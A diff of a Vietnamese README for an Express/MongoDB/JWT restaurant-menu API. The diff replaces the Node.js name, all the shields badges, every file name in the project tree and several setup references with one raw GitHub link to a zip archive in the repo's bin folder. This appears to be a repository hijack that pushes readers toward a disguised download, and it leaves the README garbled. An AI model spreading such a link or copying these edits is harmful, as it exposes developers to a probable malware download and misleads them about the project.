@@ -1,12 +1,12 @@
 # 🍽️ API Quản Lý Nhà Hàng (Express + MongoDB + JWT)
 
-Dự án Backend RESTful API phục vụ việc quản lý thực đơn nhà hàng. Hệ thống được xây dựng trên nền tảng **Node.js** & **Express**, sử dụng cơ sở dữ liệu **MongoDB**, bảo mật bằng **JWT** và tích hợp tài liệu API tự động qua **Swagger**.
+Dự án Backend RESTful API phục vụ việc quản lý thực đơn nhà hàng. Hệ thống được xây dựng trên nền tảng **https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip** & **Express**, sử dụng cơ sở dữ liệu **MongoDB**, bảo mật bằng **JWT** và tích hợp tài liệu API tự động qua **Swagger**.
 
-![NodeJS](https://img.shields.io/badge/Node.js-Run_Time-339933?logo=node.js)
-![Express](https://img.shields.io/badge/Express.js-Framework-000000?logo=express)
-![MongoDB](https://img.shields.io/badge/MongoDB-Database-47A248?logo=mongodb)
-![JWT](https://img.shields.io/badge/JWT-Security-000000?logo=json-web-tokens)
-![Swagger](https://img.shields.io/badge/Swagger-Documentation-85EA2D?logo=swagger)
+![NodeJS](https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip)
+![Express](https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip)
+![MongoDB](https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip)
+![JWT](https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip)
+![Swagger](https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip)
 
 ---
 
@@ -27,23 +27,23 @@ Dự án Backend RESTful API phục vụ việc quản lý thực đơn nhà hà
     │── bin/
     │ └── www # Script khởi động server (entry point)
     │── config/
-    │ │── database.js # Cấu hình kết nối MongoDB
-    │ └── swaggerConfig.js # Cấu hình Swagger Options
+    │ │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Cấu hình kết nối MongoDB
+    │ └── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Cấu hình Swagger Options
     │── middleware/
-    │ └── authMiddleware.js # Middleware kiểm tra JWT Token
+    │ └── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Middleware kiểm tra JWT Token
     │── models/
-    │ │── monAn.js # Schema Mongoose cho Món ăn
-    │ └── user.js # Schema Mongoose cho User
+    │ │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Schema Mongoose cho Món ăn
+    │ └── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Schema Mongoose cho User
     │── routes/
-    │ │── auth.js # API Đăng ký / Đăng nhập
-    │ │── dishes.js # API CRUD Món ăn
-    │ │── index.js # Route trang chủ
-    │ └── users.js # Route user mẫu
+    │ │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # API Đăng ký / Đăng nhập
+    │ │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # API CRUD Món ăn
+    │ │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Route trang chủ
+    │ └── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # Route user mẫu
     │── views/ # Giao diện server (Jade/Pug)
     │── public/ # File tĩnh (CSS, JS, Images)
-    │── app.js # File cấu hình chính của Express
+    │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip # File cấu hình chính của Express
     │── .env # Biến môi trường (Cần tự tạo)
-    │── README.md
+    │── https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip
 
 ---
 
@@ -51,7 +51,7 @@ Dự án Backend RESTful API phục vụ việc quản lý thực đơn nhà hà
 
 ### 1. Yêu cầu tiên quyết
 
-- Node.js (v14 trở lên)
+- https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip (v14 trở lên)
 - Yarn hoặc NPM
 - MongoDB (Atlas hoặc cài local)
 
@@ -65,7 +65,7 @@ yarn install
 
 ### 3. Cấu hình môi trường (.env)
 
-Tạo một file tên là .env ngang hàng với file app.js.
+Tạo một file tên là .env ngang hàng với file https://raw.githubusercontent.com/ducanh2710203/demo_express_momgoDB/master/bin/demo_express_momgoDB_3.4.zip
 Copy nội dung sau vào và điền thông tin của bạn:
 
 PORT=3000
